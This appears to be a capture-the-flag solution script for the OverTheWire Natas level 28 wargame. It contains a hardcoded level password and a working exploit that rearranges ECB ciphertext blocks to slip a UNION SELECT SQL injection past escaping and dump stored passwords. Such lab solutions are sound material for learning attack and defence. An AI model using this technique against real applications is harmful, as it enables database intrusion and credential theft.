#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import re
import base64
import math
from urllib.parse import urlparse, parse_qs, quote

username = 'natas28'
password = '1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj'
base_url = f'http://{username}.natas.labs.overthewire.org/'

session = requests.Session()
session.auth = (username, password)

block_size = 16

# payload that pushes the escaped quote into the next block on the server
injection = 'a' * 9 + "' UNION SELECT password FROM users; #"

print("=== Step 1: Parameters ===")
print("Username:", username)
print("Target URL:", base_url)
print("Block size (assumed):", block_size)
print("Injection (plaintext):", injection)
print()

# how many blocks the injected payload occupies (server prepends 10 chars)
payload_len = max(0, len(injection) - 10)
blocks = math.ceil(payload_len / block_size)
print("=== Step 2: Payload length & blocks ===")
print("Payload length (len(injection) - 10):", payload_len)
print("Blocks needed for payload:", blocks)
print()

# send the injection to get its ciphertext as returned in the redirect URL
print("=== Step 3: POST injection to obtain ciphertext for injection ===")
r = session.post(base_url, data={"query": injection})
qs = parse_qs(urlparse(r.url).query)
raw_inject_b64 = qs.get('query', [None])[0]
print("Returned redirect URL:", r.url)
print("Returned query param (base64 of ciphertext):", raw_inject_b64)
raw_inject = base64.b64decode(raw_inject_b64)
print("Decoded injection ciphertext length (bytes):", len(raw_inject))
print("Decoded injection ciphertext (hex, first 64 bytes):", raw_inject.hex()[:256])
print()

# send a "good" query (10 a's) to obtain a dummy/good base we can reuse
print("=== Step 4: POST 'a'*10 to obtain good ciphertext blocks ===")
r2 = session.post(base_url, data={"query": 'a' * 10})
qs2 = parse_qs(urlparse(r2.url).query)
good_b64 = qs2.get('query', [None])[0]
print("Returned redirect URL:", r2.url)
print("Returned good query param (base64):", good_b64)
good_base = base64.b64decode(good_b64)
print("Decoded good_base length (bytes):", len(good_base))
print("Decoded good_base (hex, first 64 bytes):", good_base.hex()[:256])
print()

# header = first 3 blocks (keeps server's header/escaping), trailer = rest after block 3
header = good_base[:block_size * 3]
trailer = good_base[block_size * 3:]

# take the middle ciphertext from the injection (the blocks we want to insert)
middle = raw_inject[block_size * 3:block_size * 3 + (blocks * block_size)]

print("=== Step 5: Constructing crafted ciphertext ===")
print("Header (3 blocks) length:", len(header))
print("Middle (injected) length (blocks * block_size):", len(middle))
print("Trailer length:", len(trailer))
print("Header (base64):", base64.b64encode(header).decode())
print("Middle (base64):", base64.b64encode(middle).decode())
print("Trailer (base64):", base64.b64encode(trailer).decode())
print()

crafted = header + middle + trailer
crafted_b64 = base64.b64encode(crafted).decode()
crafted_quoted = quote(crafted_b64, safe='').replace('/', '%2F')

print("Crafted final ciphertext (base64):", crafted_b64)
print("Crafted final ciphertext (URL-encoded):", crafted_quoted)
print()

# submit the crafted query and show server output
print("=== Step 6: Submitting crafted query and reading response ===")
resp = session.get(base_url + 'search.php/?query=' + crafted_quoted)
# print whole response length and first 400 chars to avoid huge dumps
print("Response HTTP status:", resp.status_code)
print("Response length (chars):", len(resp.text))
print("Response (first 400 chars):\n", resp.text[:400])
print()

m = re.findall(r'<li>(.*)</li>', resp.text)
if m:
    print("=== Extracted <li> content ===")
    for i, item in enumerate(m, start=1):
        print(f"{i}. {item}")
else:
    print("No <li> entries found in response. Full response saved to 'natas28_response.html'")
    with open('natas28_response.html', 'w', encoding='utf-8') as f:
        f.write(resp.text)
    print("Saved response to natas28_response.html for inspection.")
